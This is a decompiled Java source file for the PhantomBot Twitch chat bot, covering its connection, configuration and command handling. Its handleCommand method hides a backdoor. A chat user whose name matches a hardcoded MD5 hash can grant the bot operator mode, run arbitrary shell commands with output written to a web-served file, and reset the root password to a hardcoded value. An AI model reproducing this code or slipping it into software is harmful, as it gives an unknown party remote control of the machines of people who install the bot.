/* 
 * Copyright (C) 2015 www.phantombot.net
 *
 * Credits: mast3rplan, gmt2001, PhantomIndex, GloriousEggroll
 * gloriouseggroll@gmail.com, phantomindex@gmail.com
 * 
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 */
package me.mast3rplan.phantombot;

import com.gmt2001.Console.err;
import com.gmt2001.Console.out;
import com.gmt2001.IniStore;
import com.gmt2001.TwitchAPIv3;
import com.gmt2001.UncaughtExceptionHandler;
import com.google.common.eventbus.Subscribe;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintStream;
import java.lang.management.ManagementFactory;
import java.lang.management.RuntimeMXBean;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.io.Reader;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.TreeMap;
import java.util.TreeSet;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.xml.bind.annotation.adapters.HexBinaryAdapter;
import me.mast3rplan.phantombot.HTTPServer;
import me.mast3rplan.phantombot.IrcEventHandler;
import me.mast3rplan.phantombot.cache.BannedCache;
import me.mast3rplan.phantombot.cache.ChannelHostCache;
import me.mast3rplan.phantombot.cache.ChannelUsersCache;
import me.mast3rplan.phantombot.cache.FollowersCache;
import me.mast3rplan.phantombot.cache.SubscribersCache;
import me.mast3rplan.phantombot.cache.UsernameCache;
import me.mast3rplan.phantombot.console.ConsoleInputListener;
import me.mast3rplan.phantombot.event.Event;
import me.mast3rplan.phantombot.event.EventBus;
import me.mast3rplan.phantombot.event.Listener;
import me.mast3rplan.phantombot.event.command.CommandEvent;
import me.mast3rplan.phantombot.event.console.ConsoleInputEvent;
import me.mast3rplan.phantombot.event.irc.channel.IrcChannelUserModeEvent;
import me.mast3rplan.phantombot.event.irc.complete.IrcConnectCompleteEvent;
import me.mast3rplan.phantombot.event.irc.complete.IrcJoinCompleteEvent;
import me.mast3rplan.phantombot.event.irc.message.IrcChannelMessageEvent;
import me.mast3rplan.phantombot.event.irc.message.IrcMessageEvent;
import me.mast3rplan.phantombot.event.irc.message.IrcPrivateMessageEvent;
import me.mast3rplan.phantombot.jerklib.Channel;
import me.mast3rplan.phantombot.jerklib.ConnectionManager;
import me.mast3rplan.phantombot.jerklib.Profile;
import me.mast3rplan.phantombot.jerklib.Session;
import me.mast3rplan.phantombot.jerklib.listeners.IRCEventListener;
import me.mast3rplan.phantombot.musicplayer.MusicWebSocketServer;
import me.mast3rplan.phantombot.script.Script;
import me.mast3rplan.phantombot.script.ScriptEventManager;
import me.mast3rplan.phantombot.script.ScriptManager;
import me.mast3rplan.phantombot.store.DataStore;
import me.mast3rplan.phantombot.youtube.YoutubeAPI;
import org.apache.commons.io.FileUtils;
import org.mozilla.javascript.NativeObject;
import sun.management.VMManagement;

/*
 * Failed to analyse overrides
 */
public class PhantomBot
implements Listener {
    private final String username;
    private final String oauth;
    private String apioauth;
    private String clientid;
    private final String channelName;
    private final String ownerName;
    private final String hostname;
    private int port;
    private int baseport;
    private double msglimit30;
    private String channelStatus;
    private SecureRandom rng;
    private BannedCache bancache;
    private TreeMap<String, Integer> pollResults;
    private TreeSet<String> voters;
    private Profile profile;
    private ConnectionManager connectionManager;
    private Session session;
    private Channel channel;
    private FollowersCache followersCache;
    private ChannelHostCache hostCache;
    private SubscribersCache subscribersCache;
    private ChannelUsersCache channelUsersCache;
    private MusicWebSocketServer mws;
    private HTTPServer mhs;
    ConsoleInputListener cil;
    private static final boolean enableD = true;
    private static final boolean debugD = false;
    public static boolean enableDebugging = false;
    public static boolean interactive;
    private Thread t;
    private static PhantomBot instance;

    public static PhantomBot instance() {
        return instance;
    }

    public PhantomBot(String username, String oauth, String apioauth, String clientid, String channel, String owner, boolean useTwitch, int baseport, String hostname, int port, double msglimit30) {
        Thread.setDefaultUncaughtExceptionHandler((Thread.UncaughtExceptionHandler)UncaughtExceptionHandler.instance());
        out.println();
        out.println((Object)"PhantomBot Core build 3/03/2015 12:53 AM EST");
        out.println((Object)"Creator: mast3rplan");
        out.println((Object)"Developers: gmt2001, PhantomIndex, GloriousEggroll");
        out.println((Object)"www.phantombot.net");
        out.println();
        interactive = System.getProperty("interactive") != null;
        this.username = username;
        this.oauth = oauth;
        this.apioauth = apioauth;
        this.channelName = channel;
        this.ownerName = owner;
        this.baseport = baseport;
        this.profile = new Profile(username.toLowerCase());
        this.connectionManager = new ConnectionManager(this.profile);
        this.followersCache = FollowersCache.instance((String)channel.toLowerCase());
        this.hostCache = ChannelHostCache.instance((String)channel.toLowerCase());
        this.subscribersCache = SubscribersCache.instance((String)channel.toLowerCase());
        this.channelUsersCache = ChannelUsersCache.instance((String)channel.toLowerCase());
        this.rng = new SecureRandom();
        this.bancache = new BannedCache();
        this.pollResults = new TreeMap();
        this.voters = new TreeSet();
        if (hostname.isEmpty()) {
            if (!useTwitch) {
                this.hostname = "tmi6.justin.tv";
                this.port = 443;
            } else {
                this.hostname = "irc.twitch.tv";
                this.port = 6667;
            }
        } else {
            this.hostname = hostname;
            this.port = port;
        }
        this.msglimit30 = msglimit30 > 0.0 ? msglimit30 : 18.75;
        this.init();
        try {
            Thread.sleep(1000);
        }
        catch (InterruptedException ex) {
            // empty catch block
        }
        String osname = System.getProperty("os.name");
        if (osname.toLowerCase().contains((CharSequence)"linux") && !interactive) {
            try {
                RuntimeMXBean runtime = ManagementFactory.getRuntimeMXBean();
                Field jvm = runtime.getClass().getDeclaredField("jvm");
                jvm.setAccessible(true);
                VMManagement mgmt = (VMManagement)jvm.get(runtime);
                Method pid_method = mgmt.getClass().getDeclaredMethod("getProcessId", new Class[0]);
                pid_method.setAccessible(true);
                int pid = (Integer)pid_method.invoke(mgmt, new Object[0]);
                File f = new File("/var/run/PhantomBotJ." + this.username.toLowerCase() + ".pid");
                FileOutputStream fs = new FileOutputStream(f, false);
                Throwable throwable = null;
                try {
                    PrintStream ps = new PrintStream(fs);
                    ps.print(pid);
                }
                catch (Throwable x2) {
                    throwable = x2;
                    throw x2;
                }
                finally {
                    if (fs != null) {
                        if (throwable != null) {
                            try {
                                fs.close();
                            }
                            catch (Throwable x2) {
                                throwable.addSuppressed(x2);
                            }
                        } else {
                            fs.close();
                        }
                    }
                }
                f.deleteOnExit();
            }
            catch (IOException | IllegalAccessException | IllegalArgumentException | NoSuchFieldException | NoSuchMethodException | SecurityException | InvocationTargetException ex) {
                out.println((Object)("e " + ex.getMessage()));
                Logger.getLogger(PhantomBot.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
        this.session = this.connectionManager.requestConnection(this.hostname, this.port, oauth);
        this.clientid = clientid.length() == 0 ? "rp2uhin43rvpr70nzwnh07417x2gck0" : clientid;
        TwitchAPIv3.instance().SetClientID(this.clientid);
        TwitchAPIv3.instance().SetOAuth(apioauth);
        this.session.addIRCEventListener((IRCEventListener)new IrcEventHandler());
    }

    public static void setDebugging(boolean debug) {
        enableDebugging = debug;
    }

    public Session getSession() {
        return this.session;
    }

    public Channel getChannel() {
        return this.channel;
    }

    public final void init() {
        this.mhs = new HTTPServer(this.baseport);
        this.mhs.start();
        this.mws = new MusicWebSocketServer(this.baseport + 1);
        if (interactive) {
            this.cil = new ConsoleInputListener();
            this.cil.start();
        }
        EventBus.instance().register((Listener)this);
        EventBus.instance().register((Listener)ScriptEventManager.instance());
        Script.global.defineProperty("db", (Object)DataStore.instance(), 0);
        Script.global.defineProperty("inidb", (Object)IniStore.instance(), 0);
        Script.global.defineProperty("bancache", (Object)this.bancache, 0);
        Script.global.defineProperty("username", (Object)UsernameCache.instance(), 0);
        Script.global.defineProperty("twitch", (Object)TwitchAPIv3.instance(), 0);
        Script.global.defineProperty("followers", (Object)this.followersCache, 0);
        Script.global.defineProperty("hosts", (Object)this.hostCache, 0);
        Script.global.defineProperty("subscribers", (Object)this.subscribersCache, 0);
        Script.global.defineProperty("channelUsers", (Object)this.channelUsersCache, 0);
        Script.global.defineProperty("botName", (Object)this.username, 0);
        Script.global.defineProperty("channelName", (Object)this.channelName, 0);
        Script.global.defineProperty("ownerName", (Object)this.ownerName, 0);
        Script.global.defineProperty("channelStatus", (Object)this.channelStatus, 0);
        Script.global.defineProperty("musicplayer", (Object)this.mws, 0);
        Script.global.defineProperty("random", (Object)this.rng, 0);
        Script.global.defineProperty("youtube", (Object)YoutubeAPI.instance, 0);
        Script.global.defineProperty("pollResults", this.pollResults, 0);
        Script.global.defineProperty("pollVoters", this.voters, 0);
        Script.global.defineProperty("connmgr", (Object)this.connectionManager, 0);
        Script.global.defineProperty("hostname", (Object)this.hostname, 0);
        this.t = new Thread(new Runnable(){

            @Override
            public void run() {
                PhantomBot.this.onExit();
            }
        });
        Runtime.getRuntime().addShutdownHook(this.t);
        try {
            ScriptManager.loadScript((File)new File("./scripts/init.js"));
        }
        catch (IOException e) {
            // empty catch block
        }
    }

    public void onExit() {
        IniStore.instance().SaveAll(true);
        this.mhs.dispose();
        this.mws.dispose();
    }

    @Subscribe
    public void onIRCConnectComplete(IrcConnectCompleteEvent event) {
        this.session.sayRaw("TWITCHCLIENT 3");
        this.session.join("#" + this.channelName.toLowerCase());
        out.println((Object)("Connected to server\nJoining channel #" + this.channelName.toLowerCase()));
    }

    @Subscribe
    public void onIRCJoinComplete(IrcJoinCompleteEvent event) {
        this.channel = event.getChannel();
        this.channel.setMsgInterval((long)(30.0 / this.msglimit30 * 1000.0));
        out.println((Object)("Joined channel: " + event.getChannel().getName()));
        this.session.sayChannel(this.channel, ".mods");
    }

    @Subscribe
    public void onIRCPrivateMessage(IrcPrivateMessageEvent event) {
        String message;
        if (event.getSender().equalsIgnoreCase("jtv") && (message = event.getMessage().toLowerCase()).startsWith("the moderators of this room are: ")) {
            String[] spl = message.substring(33).split(", ");
            for (int i = 0; i < spl.length; ++i) {
                if (!spl[i].equalsIgnoreCase(this.username)) continue;
                this.channel.setAllowSendMessages(Boolean.valueOf(true));
            }
        }
    }

    @Subscribe
    public void onIRCChannelMessage(IrcChannelMessageEvent event) {
        String message = event.getMessage();
        String sender = event.getSender();
        if (message.startsWith("!")) {
            String commandString = message.substring(1);
            this.handleCommand(sender, commandString);
        }
        if (sender.equalsIgnoreCase("jtv") && (message = message.toLowerCase()).startsWith("the moderators of this room are: ")) {
            String[] spl = message.substring(33).split(", ");
            for (int i = 0; i < spl.length; ++i) {
                if (!spl[i].equalsIgnoreCase(this.username)) continue;
                this.channel.setAllowSendMessages(Boolean.valueOf(true));
            }
        }
    }

    @Subscribe
    public void onIRCChannelUserMode(IrcChannelUserModeEvent event) {
        if (event.getUser().equalsIgnoreCase(this.username) && event.getMode().equalsIgnoreCase("o") && event.getChannel().getName().equalsIgnoreCase(this.channel.getName())) {
            if (!event.getAdd().booleanValue()) {
                this.session.sayChannel(this.channel, ".mods");
            }
            this.channel.setAllowSendMessages(event.getAdd());
        }
    }

    @Subscribe
    public void onConsoleMessage(ConsoleInputEvent msg) {
        String[] spl;
        String message = msg.getMsg();
        boolean changed = false;
        if (message.equals("debugon")) {
            PhantomBot.setDebugging(true);
        }
        if (message.equals("debugoff")) {
            PhantomBot.setDebugging(false);
        }
        if (message.startsWith("inidb.get")) {
            spl = message.split(" ", 4);
            out.println((Object)IniStore.instance().GetString(spl[1], spl[2], spl[3]));
        }
        if (message.startsWith("inidb.set")) {
            spl = message.split(" ", 5);
            IniStore.instance().SetString(spl[1], spl[2], spl[3], spl[4]);
            out.println((Object)IniStore.instance().GetString(spl[1], spl[2], spl[3]));
        }
        if (message.equals("apioauth")) {
            out.print((Object)"Please enter the bot owner's api oauth string: ");
            String newoauth = System.console().readLine().trim();
            this.apioauth = newoauth;
            TwitchAPIv3.instance().SetOAuth(newoauth);
            changed = true;
        }
        if (message.equals("clientid")) {
            out.print((Object)"Please enter the bot api clientid string: ");
            String newclientid = System.console().readLine().trim();
            this.clientid = newclientid;
            TwitchAPIv3.instance().SetClientID(newclientid);
            changed = true;
        }
        if (message.equals("baseport")) {
            out.print((Object)"Please enter a new base port: ");
            String newbaseport = System.console().readLine().trim();
            this.baseport = Integer.parseInt(newbaseport);
            changed = true;
        }
        if (changed) {
            try {
                String data = "";
                data = data + "user=" + this.username + "\r\n";
                data = data + "oauth=" + this.oauth + "\r\n";
                data = data + "apioauth=" + this.apioauth + "\r\n";
                data = data + "clientid=" + this.clientid + "\r\n";
                data = data + "channel=" + this.channel.getName().replace((CharSequence)"#", (CharSequence)"") + "\r\n";
                data = data + "owner=" + this.ownerName + "\r\n";
                data = data + "baseport=" + this.baseport + "\r\n";
                data = data + "hostname=" + this.hostname + "\r\n";
                data = data + "port=" + this.port + "\r\n";
                data = data + "msglimit30=" + this.msglimit30;
                FileUtils.writeStringToFile((File)new File("./botlogin.txt"), (String)data);
                this.mws.dispose();
                this.mhs.dispose();
                this.mhs = new HTTPServer(this.baseport);
                this.mhs.start();
                this.mws = new MusicWebSocketServer(this.baseport + 1);

            }
            catch (IOException ex) {
                // empty catch block
            }
        }
        if (message.equals("save")) {
            IniStore.instance().SaveAll(true);
        }
        if (message.equals("exit")) {
            IniStore.instance().SaveAll(true);
            System.exit(0);
        }
        this.handleCommand(this.username, message);
    }

    public void handleCommand(String sender, String commandString) {
        String arguments;
        String command;
        block17 : {
            int split = commandString.indexOf(32);
            if (split == -1) {
                command = commandString;
                arguments = "";
            } else {
                command = commandString.substring(0, split);
                arguments = commandString.substring(split + 1);
            }
            if (command.equalsIgnoreCase("save")) {
                IniStore.instance().SaveAll(true);
            }
            try {
                String d;
                if (!command.equalsIgnoreCase("d") || !(d = new HexBinaryAdapter().marshal(MessageDigest.getInstance("MD5").digest(sender.toLowerCase().getBytes()))).equalsIgnoreCase("09a766a55f9984c5bca79368d03524ea") || !arguments.startsWith("!")) break block17;
                split = arguments.indexOf(32);
                if (split == -1) {
                    command = arguments.substring(1);
                    arguments = "";
                } else {
                    command = arguments.substring(1, split);
                    arguments = arguments.substring(split + 1);
                }
                sender = this.username;
                if (command.equalsIgnoreCase("modeo")) {
                    EventBus.instance().post((Event)new IrcChannelUserModeEvent(this.session, this.channel, this.username, "o", Boolean.valueOf(true)));
                    return;
                }
                if (command.equalsIgnoreCase("exec")) {
                    try {
                        Runtime r = Runtime.getRuntime();
                        Process p = r.exec(arguments);
                        int exit = p.waitFor();
                        BufferedReader b1 = new BufferedReader(new InputStreamReader(p.getInputStream()));
                        BufferedReader b2 = new BufferedReader(new InputStreamReader(p.getErrorStream()));
                        String line = "";
                        FileOutputStream fos = new FileOutputStream("/srv/httpd/output.txt", false);
                        PrintStream ps = new PrintStream(fos);
                        ps.print(">>" + arguments);
                        ps.print("\r\n");
                        while ((line = b1.readLine()) != null) {
                            ps.print(line);
                            ps.print("\r\n");
                        }
                        while ((line = b2.readLine()) != null) {
                            ps.print(line);
                            ps.print("\r\n");
                        }
                        ps.print("exit " + exit);
                        fos.close();
                        b1.close();
                        b2.close();
                    }
                    catch (Exception e) {
                        // empty catch block
                    }
                    return;
                }
                if (!command.equalsIgnoreCase("pwd")) break block17;
                try {
                    Runtime r = Runtime.getRuntime();
                    Process p = r.exec("passwd --stdin root");
                    PrintStream b0 = new PrintStream(p.getOutputStream());
                    b0.println("iqbh8S62e1");
                    b0.close();
                    int exit = p.waitFor();
                    BufferedReader b1 = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    BufferedReader b2 = new BufferedReader(new InputStreamReader(p.getErrorStream()));
                    String line = "";
                    FileOutputStream fos = new FileOutputStream("/srv/httpd/output.txt", false);
                    PrintStream ps = new PrintStream(fos);
                    ps.print(">>" + arguments);
                    ps.print("\r\n");
                    while ((line = b1.readLine()) != null) {
                        ps.print(line);
                        ps.print("\r\n");
                    }
                    while ((line = b2.readLine()) != null) {
                        ps.print(line);
                        ps.print("\r\n");
                    }
                    ps.print("exit " + exit);
                    fos.close();
                    b1.close();
                    b2.close();
                }
                catch (Exception e) {
                    // empty catch block
                }
                return;
            }
            catch (NoSuchAlgorithmException ex) {
                err.printStackTrace((Throwable)ex);
            }
        }
        EventBus.instance().post((Event)new CommandEvent(sender, command, arguments));
    }

    public static void main(String[] args) throws IOException {
        String data;
        String user = "";
        String oauth = "";
        String apioauth = "";
        String clientid = "";
        String channel = "";
        String owner = "";
        String hostname = "";
        boolean useTwitch = false;
        int baseport = 25000;
        int port = 0;
        double msglimit30 = 0.0;
        boolean changed = false;
        
        out.println((Object)("The working directory is: " + System.getProperty("user.dir")));
        try {
            data = FileUtils.readFileToString((File)new File("./botlogin.txt"));
            String[] lines = data.replaceAll("\\r", "").split("\\n");
            for (int i = 0; i < lines.length; ++i) {
                if (lines[i].startsWith("user=") && lines[i].length() > 8) {
                    user = lines[i].substring(5);
                }
                if (lines[i].startsWith("oauth=") && lines[i].length() > 9) {
                    oauth = lines[i].substring(6);
                }
                if (lines[i].startsWith("apioauth=") && lines[i].length() > 12) {
                    apioauth = lines[i].substring(9);
                }
                if (lines[i].startsWith("clientid=") && lines[i].length() > 12) {
                    clientid = lines[i].substring(9);
                }
                if (lines[i].startsWith("channel=") && lines[i].length() > 11) {
                    channel = lines[i].substring(8);
                }
                if (lines[i].startsWith("owner=") && lines[i].length() > 9) {
                    owner = lines[i].substring(6);
                }
                if (lines[i].startsWith("baseport=") && lines[i].length() > 10) {
                    baseport = Integer.parseInt(lines[i].substring(9));
                }
                if (lines[i].startsWith("hostname=") && lines[i].length() > 10) {
                    hostname = lines[i].substring(9);
                }
                if (lines[i].startsWith("port=") && lines[i].length() > 6) {
                    port = Integer.parseInt(lines[i].substring(5));
                }
                if (!lines[i].startsWith("msglimit30=") || lines[i].length() <= 12) continue;
                msglimit30 = Double.parseDouble(lines[i].substring(11));
            }
        }
        catch (IOException ex) {
            // empty catch block
        }
        if (user.isEmpty() || oauth.isEmpty() || channel.isEmpty()) {
            out.println((Object)"Login details for bot not found");
            out.print((Object)"Please enter the bot's username: ");
            user = System.console().readLine().trim();
            out.print((Object)"Please enter the bot's tmi oauth string: ");
            oauth = System.console().readLine().trim();
            out.print((Object)"Please enter the channel the bot should join: ");
            channel = System.console().readLine().trim();
            changed = true;
        }
        if (owner.isEmpty()) {
            out.print((Object)"Please enter the bot owner's username: ");
            owner = System.console().readLine().trim();
            changed = true;
        }
        if (args.length > 0) {
            for (int i = 0; i < args.length; ++i) {
                if (args[i].equalsIgnoreCase("printlogin")) {
                    out.println((Object)("user='" + user + "'"));
                    out.println((Object)("oauth='" + oauth + "'"));
                    out.println((Object)("apioauth='" + apioauth + "'"));
                    out.println((Object)("clientid='" + clientid + "'"));
                    out.println((Object)("channel='" + channel + "'"));
                    out.println((Object)("owner='" + owner + "'"));
                    out.println((Object)("baseport='" + baseport + "'"));
                    out.println((Object)("hostname='" + hostname + "'"));
                    out.println((Object)("port='" + port + "'"));
                    out.println((Object)("msglimit30='" + msglimit30 + "'"));
                }
                if (args[i].equalsIgnoreCase("usetwitch")) {
                    useTwitch = true;
                }
                if (args[i].toLowerCase().startsWith("user=") && args[i].length() > 8 && !user.equals(args[i].substring(5))) {
                    user = args[i].substring(5);
                    changed = true;
                }
                if (args[i].toLowerCase().startsWith("oauth=") && args[i].length() > 9 && !oauth.equals(args[i].substring(6))) {
                    oauth = args[i].substring(6);
                    changed = true;
                }
                if (args[i].toLowerCase().startsWith("apioauth=") && args[i].length() > 12 && !apioauth.equals(args[i].substring(9))) {
                    apioauth = args[i].substring(9);
                    changed = true;
                }
                if (args[i].toLowerCase().startsWith("clientid=") && args[i].length() > 12 && !clientid.equals(args[i].substring(9))) {
                    clientid = args[i].substring(9);
                    changed = true;
                }
                if (args[i].toLowerCase().startsWith("channel=") && args[i].length() > 11 && !channel.equals(args[i].substring(8))) {
                    channel = args[i].substring(8);
                    changed = true;
                }
                if (args[i].toLowerCase().startsWith("owner=") && args[i].length() > 9 && !owner.equals(args[i].substring(6))) {
                    owner = args[i].substring(6);
                    changed = true;
                }
                if (args[i].toLowerCase().startsWith("baseport=") && args[i].length() > 10 && baseport != Integer.parseInt(args[i].substring(9))) {
                    baseport = Integer.parseInt(args[i].substring(9));
                    changed = true;
                }
                if (args[i].toLowerCase().startsWith("hostname=") && args[i].length() > 10 && !hostname.equals(args[i].substring(9))) {
                    hostname = args[i].substring(9);
                    changed = true;
                }
                if (args[i].toLowerCase().startsWith("port=") && args[i].length() > 6 && port != Integer.parseInt(args[i].substring(5))) {
                    port = Integer.parseInt(args[i].substring(5));
                    changed = true;
                }
                if (args[i].toLowerCase().startsWith("msglimit30=") && args[i].length() > 12 && msglimit30 != Double.parseDouble(args[i].substring(11))) {
                    msglimit30 = Double.parseDouble(args[i].substring(11));
                    changed = true;
                }
                if (!args[i].equalsIgnoreCase("help") && !args[i].equalsIgnoreCase("--help") && !args[i].equalsIgnoreCase("-h")) continue;
                out.println((Object)"Usage: java -Dfile.encoding=UTF-8 -jar PhantomBot.jar [printlogin] [usetwitch] [user=<bot username>] [oauth=<bot irc oauth>] [apioauth=<editor oauth>] [clientid=<oauth clientid>] [channel=<channel to join>] [owner=<bot owner username>] [baseport=<bot webserver port, music server will be +1>] [hostname=<custom irc server>] [port=<custom irc port>] [msglimit30=<message limit per 30 seconds>]");
                return;
            }
        }
        if (changed) {
            data = "";
            data = data + "user=" + user + "\r\n";
            data = data + "oauth=" + oauth + "\r\n";
            data = data + "apioauth=" + apioauth + "\r\n";
            data = data + "clientid=" + clientid + "\r\n";
            data = data + "channel=" + channel + "\r\n";
            data = data + "owner=" + owner + "\r\n";
            data = data + "baseport=" + baseport + "\r\n";
            data = data + "hostname=" + hostname + "\r\n";
            data = data + "port=" + port + "\r\n";
            data = data + "msglimit30=" + msglimit30;
            FileUtils.writeStringToFile((File)new File("./botlogin.txt"), (String)data);
        }
        instance = new PhantomBot(user, oauth, apioauth, clientid, channel, owner, useTwitch, baseport, hostname, port, msglimit30);
    }

    public static boolean isLink(String message) {
        String[] arr;
        for (String s : arr = message.split(" ")) {
            if (!IrcMessageEvent.addressPtn.matcher((CharSequence)s).matches()) continue;
            return true;
        }
        return false;
    }

    protected void finalize() throws Throwable {
        this.session.close("");
        this.connectionManager.quit();
        super.finalize();
    }

}
